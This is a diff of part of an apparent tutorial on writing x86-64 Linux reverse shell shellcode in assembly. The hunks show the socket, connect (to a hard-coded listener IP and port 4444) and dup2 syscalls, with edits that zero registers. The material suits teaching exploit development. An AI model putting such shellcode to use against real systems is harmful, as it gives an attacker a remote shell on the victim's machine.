@@ -187,10 +187,12 @@ sock = socket(AF_INET, SOCK_STREAM, 0);
 Remember that we can use Python to easily find out the values, for AF_INET & SOCK_STREAM, that we need to pass in Assembly. Recall that the value for AF_INET needs to be 2 and the value for SOCK_STREAM needs to be 1. So let’s put together our first block of assembly code.
 
 ```nasm
+xor rsi, rsi ;make sure rsi is 0
+xor rdx, rdx ;make sure rdx is 0
 mov rax, 41 ;Syscall number for socket
 mov rdi, 2 ;Value for AF_INET
 mov rsi, 1 ;Value for SOCK_STREAM
-mov rdx, 0 ;Third argument where we need to pass a 0
+;RDX is already 0 for third argument where we need to pass a 0
 syscall ;Give the syscall instruction
 
 mov rdi, rax ;store file descriptor that is returned by the syscall in rdi for future use.
@@ -214,8 +216,7 @@ connect(sock, (struct sockaddr *)&server, sockaddr_len);
 
 ```nasm
 xor rax, rax ;make sure rax is zero
-
-push rax ;push 8 zero bytes to the stack for bzero        
+        
 mov dword [rsp-4], 0x7b01a8c0 ;Move the 4 byte IP Address of our listener onto the stack using private Ip of one of my machines
 mov word [rsp-6], 0x5c11 ;Move the 2 byte desired port onto the stack
 mov word [rsp-8], 0x2 ;Value for AF_INET
@@ -238,6 +239,8 @@ dup2(sock, 2);
 ```
 
 ```nasm
+xor rax, rax ;Make sure rax is 0
+xor rsi, rsi ;Make sure rsi is 0
 mov rax, 33
 mov rsi, 0
 syscall
